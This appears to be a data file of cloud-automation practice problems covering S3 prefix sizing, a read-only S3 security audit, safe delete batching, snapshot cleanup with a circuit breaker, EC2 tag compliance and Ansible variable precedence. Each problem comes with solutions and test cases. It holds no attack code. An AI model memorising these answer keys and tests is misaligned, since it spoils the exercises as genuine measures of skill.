      [['{"x": [1, 2]}', '{"x": [1, 2, 3]}'], ['~ x: [1, 2] -> [1, 2, 3]']],
      [['{"s": "a"}', '{"s": "a"}'], []],
      [['{"a": {"b": 1}}', '{"a": 5}'], ['+ a=5', '- a.b']],
      [['{"name": "x", "on": true}', '{"name": "y", "on": false, "new": null}'], ['~ name: "x" -> "y"', '+ new=null', '~ on: true -> false']],
      [['{"tags": {}}', '{"tags": {"k": "v"}}'], ['- tags', '+ tags.k="v"']]
    ] }
  }));

  practice.push(P({
    t: 'Find the biggest S3 prefixes', l: 'Medium', tags: ['s3', 'pagination', 'grouping', 'pure function'], co: ['Dropbox', 'Amazon', 'Hotstar'], c: PURE,
    s: `<p>The storage bill doubled and you need to know which "folders" grew. Given the keys and sizes collected by a paginator, write <code>prefix_sizes(keys, sizes, depth)</code>. A key's folders are all parts before the last <code>/</code>. Its prefix is the first <code>depth</code> folders joined with <code>/</code> plus a trailing <code>/</code>; a key with no folder at all belongs to <code>/</code>. Return <code>"PREFIX TOTAL_BYTES COUNT"</code> lines sorted by total bytes descending, ties by prefix ascending.</p>`,
    ex: `<p>Keys <code>logs/2026/a.gz</code> (1000), <code>logs/2026/b.gz</code> (2000), <code>logs/2025/c.gz</code> (500), <code>img/x.png</code> (700), <code>readme.txt</code> (10), depth 1 → ${H.c('g', '["logs/ 3500 3", "img/ 700 1", "/ 10 1"]')}. At depth 2, <code>img/x.png</code> has only one folder, so it stays <code>img/</code>.</p>`,
    bw: `<p>Calling <code>list_objects_v2</code> with <code>Delimiter="/"</code> and summing only the first page of each prefix, or downloading objects to measure them. Both are slow and wrong; sizes are already in the listing, and for buckets with billions of objects, S3 Inventory or Storage Lens is the right source.</p>`,
    q: ['For a bucket with 2 billion objects, what is the best data source for this report?', ['S3 Inventory (a daily CSV/Parquet listing) or S3 Storage Lens', 'Paginate list_objects_v2 every hour', 'HEAD every object', 'The CloudTrail log'], 0, 'Listing 2 billion objects takes 2 million API calls. Inventory delivers the full listing as files you can query with Athena; Storage Lens gives prefix-level metrics.'],
    h: ['<p>Hint 1: <code>folders = key.split("/")[:-1]</code>; the prefix is <code>"/".join(folders[:depth]) + "/"</code> if there are folders, else <code>"/"</code>.</p>', '<p>Hint 2: accumulate totals and counts in two dicts (or one dict of lists) keyed by prefix.</p>', '<p>Hint 3: sort with <code>key=lambda p: (-total[p], p)</code> and format each line with f-strings. Empty input returns an empty list.</p>'],
    a: `<p>One pass over the keys groups sizes by a computed prefix; S3 has no real folders, so "folder" is just a convention on <code>/</code> in key names. Truncating to <code>depth</code> folders lets you drill down: run at depth 1 to find the big area, then depth 2 or 3 inside it. Sorting by size descending puts the answer at the top. Feeding it from a generator over the paginator keeps memory low even for millions of keys.</p>`,
    code: `def prefix_sizes(keys, sizes, depth):
    """Group S3 keys by their first depth folders; biggest totals first."""
    total, count = {}, {}
    for key, size in zip(keys, sizes):
        folders = key.split("/")[:-1]
        prefix = "/".join(folders[:depth]) + "/" if folders else "/"
        total[prefix] = total.get(prefix, 0) + size
        count[prefix] = count.get(prefix, 0) + 1
    order = sorted(total, key=lambda p: (-total[p], p))
    return [f"{p} {total[p]} {count[p]}" for p in order]`,
    cx: `<p>O(K + P log P) for K keys and P distinct prefixes.</p>`,
    f: ['Print human-readable sizes (KiB, MiB, GiB) without losing the sort order.', 'How would you include old object versions in a versioned bucket?'],
    tests: { sig: 'string[] long[] int -> string[]', fn: 'prefixSizes', cases: [
      [[['logs/2026/a.gz', 'logs/2026/b.gz', 'logs/2025/c.gz', 'img/x.png', 'readme.txt'], [1000, 2000, 500, 700, 10], 1], ['logs/ 3500 3', 'img/ 700 1', '/ 10 1']],
      [[['logs/2026/a.gz', 'logs/2026/b.gz', 'logs/2025/c.gz', 'img/x.png', 'readme.txt'], [1000, 2000, 500, 700, 10], 2], ['logs/2026/ 3000 2', 'img/ 700 1', 'logs/2025/ 500 1', '/ 10 1']],
      [[[], [], 1], []],
      [[['a/1', 'b/1'], [5, 5], 1], ['a/ 5 1', 'b/ 5 1']],
      [[['a/b/c/d/e.txt', 'a/b/c/f.txt'], [1, 2], 3], ['a/b/c/ 3 2']],
      [[['x/0'], [0], 1], ['x/ 0 1']],
      [[['backups/db/2026.dump', 'backups/web/site.tar'], [5000000000, 3000000000], 1], ['backups/ 8000000000 2']]
    ] }
  }));

  practice.push(P({
    t: 'Audit S3 buckets for public access and encryption', l: 'Medium', tags: ['boto3', 's3', 'security', 'ClientError'], co: ['Capital One', 'Razorpay', 'KPMG'],
    s: `<p>Security asks for a daily read-only check of every bucket in the account: is <b>Block Public Access</b> fully on (all four settings), is <b>default encryption</b> configured, and is <b>versioning</b> enabled? Print one line per bucket, exit 1 if any bucket fails, and post a short summary to the alerts webhook from <code>SLACK_WEBHOOK_URL</code> when there are failures. Handle the error codes S3 uses when a configuration is simply absent.</p>`,
    ex: `<p><code>FAIL app-uploads-123456789012  public_access_block=missing versioning=Suspended</code><br><code>OK   app-logs-123456789012</code><br>exit code ${H.c('r', '1')}, and one Slack message "1 of 2 buckets failed the S3 baseline".</p>`,
    bw: `<p>Treating every <code>ClientError</code> as "the check failed" (or crashing on it). <code>get_public_access_block</code> raises <code>NoSuchPublicAccessBlockConfiguration</code> when nothing is set, which is a <b>finding</b>, not an error; an <code>AccessDenied</code> is a different problem (the auditor's role is too narrow) and must be reported as such.</p>`,
    q: ['<code>get_public_access_block</code> raises ClientError with code <code>NoSuchPublicAccessBlockConfiguration</code>. What does it mean?', ['The bucket has no bucket-level block configured: report it as a failed check', 'The bucket does not exist', 'The script lacks permission', 'The API is throttled'], 0, 'S3 signals "not configured" with specific error codes. Map them to findings, and keep AccessDenied and throttling as separate outcomes so the report stays honest. (An account-level block may still apply; check s3control too for a full picture.)'],
    h: ['<p>Hint 1: <code>list_buckets</code> returns all buckets; each bucket may live in a different region, but these GET calls work from a single client in most setups (use <code>get_bucket_location</code> if you hit redirects).</p>', '<p>Hint 2: map "not configured" codes to findings: <code>NoSuchPublicAccessBlockConfiguration</code>, <code>ServerSideEncryptionConfigurationNotFoundError</code>.</p>', '<p>Hint 3: versioning: <code>get_bucket_versioning(...).get("Status")</code> is missing when never enabled, or "Suspended". Collect findings per bucket, then print, alert and choose the exit code.</p>'],
    a: `<p>For each bucket run three read-only checks and turn each into either "ok" or a named finding. The key skill is error-code mapping: S3 reports missing configuration as ClientErrors with specific codes, which are findings; <code>AccessDenied</code> is recorded as "could not check" so the auditor role gets fixed rather than the bucket being declared safe. The alert is best effort with the URL from the environment. Since January 2023 new buckets get SSE-S3 encryption by default, so the encryption check mostly catches buckets with KMS requirements you expect to see; adjust the rule to your policy.</p>`,
    code: `#!/usr/bin/env python3
"""s3_baseline.py [--profile audit] - read-only S3 baseline check."""
import argparse
import json
import os
import sys
import urllib.request

import boto3
from botocore.exceptions import ClientError

ABSENT = {"NoSuchPublicAccessBlockConfiguration", "ServerSideEncryptionConfigurationNotFoundError"}


def check_bucket(s3, name):
    findings = []
    checks = {
        "public_access_block": lambda: all(s3.get_public_access_block(Bucket=name)["PublicAccessBlockConfiguration"].values()),
        "encryption": lambda: bool(s3.get_bucket_encryption(Bucket=name)["ServerSideEncryptionConfiguration"]["Rules"]),
    }
    for label, fn in checks.items():
        try:
            if not fn():
                findings.append(f"{label}=partial")
        except ClientError as e:
            code = e.response["Error"]["Code"]
            findings.append(f"{label}={'missing' if code in ABSENT else 'unchecked:' + code}")
    status = s3.get_bucket_versioning(Bucket=name).get("Status", "Never")
    if status != "Enabled":
        findings.append(f"versioning={status}")
    return findings


def alert(text):
    url = os.environ.get("SLACK_WEBHOOK_URL")
    if not url:
        return
    req = urllib.request.Request(url, data=json.dumps({"text": text}).encode(), method="POST",
                                 headers={"Content-Type": "application/json"})
    try:
        urllib.request.urlopen(req, timeout=5).close()
    except OSError as e:
        print("alert failed:", e, file=sys.stderr)


def main(argv=None):
    p = argparse.ArgumentParser()
    p.add_argument("--profile")
    args = p.parse_args(argv)
    s3 = boto3.Session(profile_name=args.profile).client("s3")
    buckets = [b["Name"] for b in s3.list_buckets()["Buckets"]]
    failed = 0
    for name in sorted(buckets):
        findings = check_bucket(s3, name)
        failed += bool(findings)
        print(f"{'FAIL' if findings else 'OK  '} {name}  {' '.join(findings)}")
    if failed:
        alert(f":warning: {failed} of {len(buckets)} buckets failed the S3 baseline")
    return 1 if failed else 0


if __name__ == "__main__":
    sys.exit(main())`,
    cx: `<p>Three API calls per bucket; 300 buckets ≈ 900 small calls, under a minute serially, seconds with a thread pool.</p>`,
    f: ['How would you also check the account-level Block Public Access setting (s3control)?', 'Should this script fix the findings? What would the safe version of that look like?']
  }));

  practice.push(P({
    t: 'Batch keys for S3 delete_objects safely', l: 'Medium', tags: ['s3', 'batching', 'safety', 'pure function'], co: ['Amazon', 'Meesho', 'Cloudflare'], c: PURE,
    s: `<p><code>delete_objects</code> accepts at most 1000 keys per call. Write <code>delete_batches(keys, batch_size, protected)</code> that prepares the batches for a cleanup job: drop every key that starts with any prefix in <code>protected</code> (case-sensitive), drop duplicate keys (keep the first occurrence), keep the original order, and split into lists of at most <code>batch_size</code> keys. No keys left → empty list.</p>`,
    ex: `<p><code>delete_batches(["keep/x", "tmp/1", "tmp/2", "keep/y"], 1000, ["keep/"])</code> → ${H.c('g', '[["tmp/1", "tmp/2"]]')}. The protected prefix wins over everything else: those keys never reach a delete call.</p>`,
    bw: `<p>Calling <code>delete_object</code> once per key (a million keys = a million calls and hours of runtime), or filtering protected keys <b>after</b> batching, where one off-by-one bug sends a protected key along with 999 others.</p>`,
    bc: `def delete_batches(keys, batch_size, protected):
    return [keys]          # one giant call: rejected above 1000 keys, no protection, duplicates kept`,
    q: ['<code>delete_objects</code> returns HTTP 200. Did every key get deleted?', ['Not necessarily: check the <code>Errors</code> list in the response for per-key failures', 'Yes, 200 means all succeeded', 'Only if Quiet=True', 'Only in versioned buckets'], 0, 'The batch call succeeds as a whole and reports per-key problems (AccessDenied, for example) in an Errors array. A cleanup must inspect it and count failures.'],
    h: ['<p>Hint 1: filter first with <code>any(k.startswith(p) for p in protected)</code>.</p>', '<p>Hint 2: a <code>seen</code> set removes duplicates while a list keeps the order.</p>', '<p>Hint 3: chunk with <code>[clean[i:i + batch_size] for i in range(0, len(clean), batch_size)]</code>.</p>'],
    a: `<p>Filter, de-duplicate, then chunk, in that order, so protection is applied before anything else can go wrong. Order is preserved to keep logs readable and runs reproducible. Each batch becomes one <code>delete_objects(Bucket=..., Delete={"Objects": [{"Key": k} for k in batch], "Quiet": True})</code> call in apply mode, with the response's <code>Errors</code> list counted; in dry-run mode the batches are just printed with their sizes.</p>`,
    code: `def delete_batches(keys, batch_size, protected):
    """Protected keys removed, duplicates removed, order kept, chunks of at most batch_size."""
    seen, clean = set(), []
    for key in keys:
        if key in seen or any(key.startswith(p) for p in protected):
            continue
        seen.add(key)
        clean.append(key)
    return [clean[i:i + batch_size] for i in range(0, len(clean), batch_size)]`,
    cx: `<p>O(K × P) for K keys and P protected prefixes (P is tiny); O(K) memory.</p>`,
    f: ['How would you delete old versions in a versioned bucket (VersionId in each object)?', 'Add a global cap: never delete more than N keys in one run.'],
    tests: { sig: 'string[] int string[] -> string[][]', fn: 'deleteBatches', cases: [
      [[['a', 'b', 'c', 'd', 'e'], 2, []], [['a', 'b'], ['c', 'd'], ['e']]],
      [[[], 1000, []], []],
      [[['keep/x', 'tmp/1', 'tmp/2', 'keep/y'], 1000, ['keep/']], [['tmp/1', 'tmp/2']]],
      [[['a', 'a', 'b'], 2, []], [['a', 'b']]],
      [[['x/1', 'y/1'], 1, ['x/', 'y/']], []],
      [[['t1', 't2', 't3'], 3, []], [['t1', 't2', 't3']]],
      [[['logs/a', 'Logs/b'], 5, ['logs/']], [['Logs/b']]]
    ] }
  }));

  // ───────────────────────── Practice: Hard ─────────────────────────
  practice.push(P({
    t: 'Snapshot cleanup plan with retention tags and a circuit breaker', l: 'Hard', tags: ['idempotency', 'safety', 'snapshots', 'pure function'], co: ['Amazon', 'Goldman Sachs', 'Flipkart'], c: PURE,
    s: `<p>Write the planning core of the production cleanup job: <code>cleanup_plan(ids, ages, tags, days, max_delete)</code>. Parallel lists: snapshot id, age in whole days, and its tags as <code>"K1=V1;K2=V2"</code> (empty string = no tags; keys are case-sensitive; split each pair on the first <code>=</code>). A snapshot is a <b>candidate</b> when its age is <b>strictly greater</b> than <code>days</code>, it has no <code>Owner</code> tag, and its <code>Retain</code> tag is not exactly <code>true</code>. If the number of candidates exceeds <code>max_delete</code>, return the single line <code>"ABORT: N candidates exceeds max_delete M"</code>. Otherwise return candidate ids, oldest first, ties by id ascending.</p>`,
    ex: `<p>Ages <code>[40, 50, 60]</code>, tags <code>["", "Env=dev", ""]</code>, ids <code>a, b, c</code>, days 30 → ${H.c('g', '["c", "b", "a"]')}. Same input with <code>max_delete = 2</code> → ${H.c('r', '["ABORT: 3 candidates exceeds max_delete 2"]')}: the job deletes nothing and pages a human, because a sudden spike usually means a bug or a missing tag sync, not real garbage.</p>`,
    bw: `<p>Deleting candidates one by one until a counter reaches <code>max_delete</code>, then stopping. That still deletes the first N items of a bad plan; the circuit breaker must look at the <b>whole</b> plan before the first delete. Treating "has any tag" as "owned" is the other trap: a lone <code>Env=dev</code> tag says nothing about ownership.</p>`,
    bc: `def cleanup_plan(ids, ages, tags, days, max_delete):
    out = []
    for sid, age, t in zip(ids, ages, tags):
        if age >= days and not t:                  # >= is off by one; any tag counts as "owned"
            out.append(sid)
    return out[:max_delete]                        # silently deletes the first N of a bad plan`,
    q: ['Why abort the whole run instead of deleting up to <code>max_delete</code> items?', ['A plan that is suddenly huge is more likely a bug than real garbage; deleting part of it still does damage', 'AWS rejects more than N deletes', 'It is faster', 'To save API calls'], 0, 'Circuit breakers protect against wrong filters, broken tag sync or the wrong account. Stopping before the first delete, with a clear message, turns a potential outage into a ticket.'],
    h: ['<p>Hint 1: parse tags with <code>dict(p.split("=", 1) for p in t.split(";") if p)</code>.</p>', '<p>Hint 2: collect candidates as <code>(-age, id)</code> tuples so that a plain <code>sorted()</code> gives oldest first and id order on ties.</p>', '<p>Hint 3: count before returning: <code>if len(cands) &gt; max_delete</code> → the ABORT line. Age equal to days is not a candidate. Empty input → empty list.</p>'],
    a: `<p>Decide per snapshot with explicit, testable rules (strictly older, no owner, not retained), collect all candidates, and only then apply the circuit breaker to the complete plan. Sorting oldest first means that, if an operator later raises the cap and runs in batches, the most clearly stale items go first. Returning a single ABORT line keeps the function pure; the caller logs it, alerts and exits non-zero without making any delete call.</p>`,
    code: `def cleanup_plan(ids, ages, tags, days, max_delete):
    """Ids to delete (oldest first), or a single ABORT line if the plan is too big."""
    cands = []
    for sid, age, raw in zip(ids, ages, tags):
        kv = dict(pair.split("=", 1) for pair in raw.split(";") if pair)
        if age > days and "Owner" not in kv and kv.get("Retain") != "true":
            cands.append((-age, sid))
    if len(cands) > max_delete:
        return [f"ABORT: {len(cands)} candidates exceeds max_delete {max_delete}"]
    return [sid for _, sid in sorted(cands)]`,
    cx: `<p>O(n log n) for n snapshots (sorting the candidates).</p>`,
    f: ['Make the cap relative too: abort if the plan would delete more than 20% of all snapshots.', 'How would you let an operator override the breaker for one run without editing code?'],
    tests: { sig: 'string[] int[] string[] int int -> string[]', fn: 'cleanupPlan', cases: [
      [[['s1', 's2', 's3', 's4'], [40, 10, 90, 35], ['', '', 'Owner=a', 'Retain=true'], 30, 10], ['s1']],
      [[['a', 'b', 'c'], [40, 50, 60], ['', 'Env=dev', ''], 30, 10], ['c', 'b', 'a']],
      [[['a', 'b', 'c'], [40, 50, 60], ['', 'Env=dev', ''], 30, 2], ['ABORT: 3 candidates exceeds max_delete 2']],
      [[['z', 'y'], [45, 45], ['', ''], 30, 5], ['y', 'z']],
      [[['e'], [30], [''], 30, 5], []],
      [[[], [], [], 30, 5], []],
      [[['p', 'q', 'r'], [100, 100, 100], ['Retain=false;Env=dev', 'retain=true', 'Env=prod;Owner=team-x'], 30, 5], ['p', 'q']],
      [[['only'], [99], [''], 30, 0], ['ABORT: 1 candidates exceeds max_delete 0']]
    ] }
  }));

  practice.push(P({
    t: 'Tag compliance across paginated describe_instances pages', l: 'Hard', tags: ['pagination', 'boto3 shapes', 'compliance', 'pure function'], co: ['Amazon', 'JPMorgan', 'Walmart'], c: PURE,
    s: `<p>Write <code>noncompliant_instances(pages_json, required)</code>. <code>pages_json</code> is a JSON object mapping a <b>token</b> to a <code>describe_instances</code>-shaped page; the first page has token <code>""</code>, and each page's optional <code>NextToken</code> names the next one. Follow the chain from <code>""</code> (pages not reachable from it must be ignored; stop if a token repeats). Each page has <code>Reservations[]</code>, each with <code>Instances[]</code> holding <code>InstanceId</code>, <code>State.Name</code> and optional <code>Tags</code> (<code>[{"Key", "Value"}]</code>). Skip instances in state <code>terminated</code> or <code>shutting-down</code>. A required key is missing if absent or its value is empty. Return <code>"ID: missing K1,K2"</code> (keys in <code>required</code> order) for each non-compliant instance, sorted.</p>`,
    ex: `<p>Page <code>""</code> has i-1 (Owner and Env set) and i-2 (stopped, Owner only), and <code>NextToken: "p2"</code>; page <code>p2</code> has i-3 (no tags) and i-4 (terminated). A page <code>orphan</code> with i-9 is not linked. With <code>["Owner", "Env"]</code> → ${H.c('g', '["i-2: missing Env", "i-3: missing Owner,Env"]')}.</p>`,
    bw: `<p>Reading only the first page, iterating <code>page["Instances"]</code> (the instances sit inside <code>Reservations</code>), or indexing <code>i["Tags"]</code>, which crashes on untagged instances: exactly the ones you are looking for. Looping over every page in the dict rather than following tokens would also count the orphan page.</p>`,
    bc: `import json

def noncompliant_instances(pages_json, required):
    page = json.loads(pages_json)[""]
    out = []
    for i in page["Reservations"][0]["Instances"]:      # first reservation of the first page only
        keys = [t["Key"] for t in i["Tags"]]           # KeyError on untagged instances
        if any(k not in keys for k in required):
            out.append(i["InstanceId"])
    return out`,
    q: ['Why does <code>describe_instances</code> nest instances inside <code>Reservations</code>?', ['A reservation is one launch request, which can start several instances', 'Reserved Instances billing', 'Each reservation is one Availability Zone', 'It is a pagination artefact'], 0, 'Each run_instances call creates a reservation that groups the instances it launched. Flatten with two loops (or the JMESPath Reservations[].Instances[]).'],
    h: ['<p>Hint 1: follow tokens: <code>token = ""</code>, then <code>token = page.get("NextToken")</code> until None, with a <code>seen</code> set against loops.</p>', '<p>Hint 2: two nested loops flatten reservations; <code>i.get("Tags", [])</code> → dict for lookups.</p>', '<p>Hint 3: <code>missing = [k for k in required if not tags.get(k)]</code> handles absent and empty values together; sort the output lines at the end.</p>'],
    a: `<p>This is the real compliance scanner with the network removed: the dict of pages plays the API, and the token loop is exactly what a paginator does. Following tokens (not iterating the dict) proves the loop is right, and the repeated-token guard prevents infinite loops on buggy APIs. Flattening reservations, defaulting missing <code>Tags</code>, treating empty values as missing and ignoring dying instances are the four details that make real reports trustworthy. Swap the dict lookup for <code>ec2.describe_instances(**({"NextToken": token} if token else {}))</code> and it runs against AWS unchanged.</p>`,
    code: `import json


def noncompliant_instances(pages_json, required):
    """Follow NextToken from page "" and report instances missing required tags."""
    pages = json.loads(pages_json)
    out, seen, token = [], set(), ""
    while token is not None and token not in seen and token in pages:
        seen.add(token)
        page = pages[token]
        for reservation in page.get("Reservations", []):
            for inst in reservation.get("Instances", []):
                if inst["State"]["Name"] in ("terminated", "shutting-down"):
                    continue
                tags = {t["Key"]: t["Value"] for t in inst.get("Tags", [])}
                missing = [k for k in required if not tags.get(k)]
                if missing:
                    out.append(f"{inst['InstanceId']}: missing {','.join(missing)}")
        token = page.get("NextToken")
    return sorted(out)`,
    cx: `<p>O(P + I·R + n log n): every reachable page once, every instance's tags once (R required keys), then sorting the n output lines.</p>`,
    f: ['Add a rule "Env must be one of dev, stage, prod" and report wrong values separately from missing ones.', 'How would you turn the report into a reconcile plan that sets a default Owner?'],
    tests: { sig: 'string string[] -> string[]', fn: 'noncompliantInstances', cases: [
      [['{"":{"Reservations":[{"Instances":[{"InstanceId":"i-1","State":{"Name":"running"},"Tags":[{"Key":"Owner","Value":"a"},{"Key":"Env","Value":"prod"}]},{"InstanceId":"i-2","State":{"Name":"stopped"},"Tags":[{"Key":"Owner","Value":"b"}]}]}],"NextToken":"p2"},"p2":{"Reservations":[{"Instances":[{"InstanceId":"i-3","State":{"Name":"running"}}]},{"Instances":[{"InstanceId":"i-4","State":{"Name":"terminated"}}]}]},"orphan":{"Reservations":[{"Instances":[{"InstanceId":"i-9","State":{"Name":"running"}}]}]}}', ['Owner', 'Env']], ['i-2: missing Env', 'i-3: missing Owner,Env']],
      [['{"":{"Reservations":[{"Instances":[{"InstanceId":"i-1","State":{"Name":"running"},"Tags":[{"Key":"Owner","Value":"a"},{"Key":"Env","Value":"prod"}]},{"InstanceId":"i-2","State":{"Name":"stopped"},"Tags":[{"Key":"Owner","Value":"b"}]}]}],"NextToken":"p2"},"p2":{"Reservations":[{"Instances":[{"InstanceId":"i-3","State":{"Name":"running"}}]},{"Instances":[{"InstanceId":"i-4","State":{"Name":"terminated"}}]}]},"orphan":{"Reservations":[{"Instances":[{"InstanceId":"i-9","State":{"Name":"running"}}]}]}}', ['Owner']], ['i-3: missing Owner']],
      [['{"":{"Reservations":[{"Instances":[{"InstanceId":"i-3","State":{"Name":"running"}}]}]}}', []], []],
      [['{"":{"Reservations":[{"Instances":[{"InstanceId":"i-5","State":{"Name":"pending"},"Tags":[{"Key":"Owner","Value":""}]}]}]}}', ['Owner']], ['i-5: missing Owner']],
      [['{"":{"Reservations":[]}}', ['Owner']], []],
      [['{"":{"Reservations":[{"Instances":[{"InstanceId":"i-b","State":{"Name":"running"}},{"InstanceId":"i-a","State":{"Name":"running"},"Tags":[{"Key":"Env","Value":"dev"}]}]}]}}', ['Owner', 'Env']], ['i-a: missing Owner', 'i-b: missing Owner,Env']],
      [['{"":{"Reservations":[{"Instances":[{"InstanceId":"i-c","State":{"Name":"running"},"Tags":[{"Key":"owner","Value":"x"}]},{"InstanceId":"i-d","State":{"Name":"shutting-down"}}]}]}}', ['Owner']], ['i-c: missing Owner']],
      [['{"":{"Reservations":[{"Instances":[{"InstanceId":"i-e","State":{"Name":"running"}}]}],"NextToken":"x"},"x":{"Reservations":[{"Instances":[{"InstanceId":"i-f","State":{"Name":"running"}}]}],"NextToken":""}}', ['Owner']], ['i-e: missing Owner', 'i-f: missing Owner']]
    ] }
  }));

  practice.push(P({
    t: 'Effective variables for a host from a YAML inventory', l: 'Hard', tags: ['yaml', 'inventory', 'precedence', 'graph', 'pure function'], co: ['Red Hat', 'VMware', 'Infosys'], c: PURE + '<p>The input is the JSON text of the parsed YAML inventory. All variable values are strings. There are no cycles between groups.</p>',
    s: `<p>Write <code>effective_vars(inventory_json, host)</code> using simplified Ansible precedence. Index the inventory as in the guided problem (a group can appear in several places; merge its <code>vars</code>, <code>hosts</code> and <code>children</code>). A host belongs to a group if it is listed in the group's hosts or belongs to one of its children (at any depth). A group's <b>depth</b> is the length of the <b>longest</b> path of children links from a top-level group (<code>all</code> = 0). Apply the vars of every group the host belongs to, ordered by depth, then by group name; later ones win. Finally apply the host's own variables (merged from all places it is listed, in the same group order). Return sorted <code>"key=value"</code> lines; an unknown host returns <code>[]</code>.</p>`,
    ex: `<p><code>all.vars</code>: keep=7. <code>prod</code> (child of all) sets keep=30 and has child <code>web</code>, which is also listed directly under <code>all</code> and sets keep=14. Depths: all 0, prod 1, web <b>2</b> (longest path all → prod → web). For <code>web-01</code>: 7 → 30 → 14, so ${H.c('g', 'keep=14')}; the child group beats its parent.</p>`,
    bw: `<p>Merging vars in the order the groups appear in the file, or using the <b>shortest</b> depth. With <code>web</code> listed directly under <code>all</code> as well as under <code>prod</code>, the shortest depth puts web and prod at the same level and alphabetical order lets <code>prod</code> (keep=30) override the more specific <code>web</code> (keep=14), the opposite of what the inventory author meant.</p>`,
    q: ['Two groups at the same depth both set <code>color</code> for a host. Which wins here (and in Ansible by default)?', ['The group whose name sorts last alphabetically', 'The group listed first in the file', 'The group with more hosts', 'Ansible raises an error'], 0, 'Groups at the same depth are merged in alphabetical order, so the later name wins (Ansible lets you change this with ansible_group_priority). Being explicit in tests avoids surprises.'],
    h: ['<p>Hint 1: index once: <code>gvars[g]</code>, <code>ghosts[g][host]</code> (host vars) and <code>kids[g]</code>, merging repeated appearances.</p>', '<p>Hint 2: longest depth: start each top-level group at 0 and push <code>depth[child] = max(depth[child], depth[parent] + 1)</code> recursively (no cycles, so this terminates).</p>', '<p>Hint 3: membership by DFS over children; order member groups by <code>(depth[g], g)</code>; merge group vars, then host vars, and output <code>sorted(f"{k}={v}")</code>.</p>'],
    a: `<p>Three steps. Index the tree so every group name has its merged vars, hosts (with host vars) and children. Compute depth as the longest path, the rule that makes "more specific groups override less specific ones" work even when a group is linked at several levels. Then find the host's groups by DFS, sort them by (depth, name), and apply vars in that order, finishing with host-level vars. Sorting the output lines makes it diff-friendly, which is how you would use this in CI to show "what changes for web-01" in a pull request that edits the inventory.</p>`,
    code: `import json


def effective_vars(inventory_json, host):
    inv = json.loads(inventory_json)
    gvars, ghosts, kids = {}, {}, {}

    def walk(name, body):
        body = body or {}
        gvars.setdefault(name, {}).update(body.get("vars") or {})
        hosts = ghosts.setdefault(name, {})
        for h, hv in (body.get("hosts") or {}).items():
            hosts.setdefault(h, {}).update(hv or {})
        children = body.get("children") or {}
        kids.setdefault(name, set()).update(children)
        for child, child_body in children.items():
            walk(child, child_body)

    for top, body in inv.items():
        walk(top, body)

    depth = {}

    def set_depth(group, d):
        if depth.get(group, -1) >= d:
            return
        depth[group] = d
        for child in kids.get(group, ()):
            set_depth(child, d + 1)

    for top in inv:
        set_depth(top, 0)

    def member(group, seen):
        if group in seen:
            return False
        seen.add(group)
        return host in ghosts.get(group, {}) or any(member(c, seen) for c in kids.get(group, ()))

    groups = sorted((g for g in gvars if member(g, set())), key=lambda g: (depth.get(g, 0), g))
    if not groups:
        return []
    merged = {}
    for g in groups:
        merged.update(gvars[g])
    for g in groups:
        merged.update(ghosts[g].get(host, {}))
    return sorted(f"{k}={v}" for k, v in merged.items())`,
    cx: `<p>O(G · (G + H)) in the worst case for G groups and H host entries (a membership DFS per group); inventories are small, so this is instant. Memoising membership makes it O(G + H).</p>`,
    f: ['Add Ansible\'s <code>ansible_group_priority</code>: a group var that changes the order among same-depth groups.', 'How would you show, for each key, which group or host set the winning value?'],
    tests: { sig: 'string string -> string[]', fn: 'effectiveVars', cases: [
      [['{"all":{"vars":{"user":"deploy","keep":"7","dir":"/var/log"},"children":{"web":{"vars":{"keep":"14"},"hosts":{"web-01":{},"web-02":{"dir":"/srv/logs"}}},"prod":{"vars":{"keep":"30","env":"prod"},"children":{"web":{},"db":{}}},"db":{"hosts":{"db-01":{"user":"postgres"}}}}}}', 'web-01'], ['dir=/var/log', 'env=prod', 'keep=14', 'user=deploy']],
      [['{"all":{"vars":{"user":"deploy","keep":"7","dir":"/var/log"},"children":{"web":{"vars":{"keep":"14"},"hosts":{"web-01":{},"web-02":{"dir":"/srv/logs"}}},"prod":{"vars":{"keep":"30","env":"prod"},"children":{"web":{},"db":{}}},"db":{"hosts":{"db-01":{"user":"postgres"}}}}}}', 'web-02'], ['dir=/srv/logs', 'env=prod', 'keep=14', 'user=deploy']],
      [['{"all":{"vars":{"user":"deploy","keep":"7","dir":"/var/log"},"children":{"web":{"vars":{"keep":"14"},"hosts":{"web-01":{},"web-02":{"dir":"/srv/logs"}}},"prod":{"vars":{"keep":"30","env":"prod"},"children":{"web":{},"db":{}}},"db":{"hosts":{"db-01":{"user":"postgres"}}}}}}', 'db-01'], ['dir=/var/log', 'env=prod', 'keep=30', 'user=postgres']],
      [['{"all":{"vars":{"user":"deploy","keep":"7","dir":"/var/log"},"children":{"web":{"vars":{"keep":"14"},"hosts":{"web-01":{},"web-02":{"dir":"/srv/logs"}}},"prod":{"vars":{"keep":"30","env":"prod"},"children":{"web":{},"db":{}}},"db":{"hosts":{"db-01":{"user":"postgres"}}}}}}', 'ghost-99'], []],
      [['{"all":{"children":{"blue":{"vars":{"color":"blue","x":"1"},"hosts":{"h1":{}}},"green":{"vars":{"color":"green"},"hosts":{"h1":{}}}}}}', 'h1'], ['color=green', 'x=1']],
      [['{"all":{"vars":{"a":"1"},"hosts":{"bastion":{"a":"2","b":"3"}}}}', 'bastion'], ['a=2', 'b=3']],
      [['{"all":{"children":{"web":{"hosts":{"w1":null}}}}}', 'w1'], []]
    ] }
  }));

  practice.push(P({
    t: 'Tag 5,000 resources fast without getting throttled', l: 'Hard', tags: ['boto3', 'throttling', 'concurrency', 'idempotency'], co: ['Amazon', 'Salesforce', 'Swiggy'],
    s: `<p>After a reorganisation, 5,000 resources (EC2, EBS, S3, RDS) across one account must get <code>CostCenter=cc-2077</code> by Monday. Use the Resource Groups Tagging API: find resources missing the tag with <code>get_resources</code> (paginated), then <code>tag_resources</code>, which accepts at most <b>20 ARNs per call</b> and reports per-resource failures in <code>FailedResourcesMap</code>. Run batches in parallel without drowning in <code>ThrottlingException</code>, retry only what failed, make the job idempotent (a re-run touches only what is still missing), and keep dry run as the default.</p>`,
    ex: `<p>Dry run: ${H.c('y', 'would tag 4,982 resources in 250 batches')}. Apply: ${H.c('g', '4,975 tagged')}, ${H.c('r', '7 failed (AccessDeniedException on 7 RDS snapshots shared from another account)')}, exit 1. A second run finds 7 missing, tries them again, and they fail again for the same reason: no work is repeated.</p>`,
    bw: `<p>One <code>create_tags</code> call per resource in a tight loop with 50 threads: 5,000 calls, a storm of throttling errors, a hand-rolled retry that multiplies the load, and no record of which resources actually failed (the batch API returns HTTP 200 even when individual resources fail).</p>`,
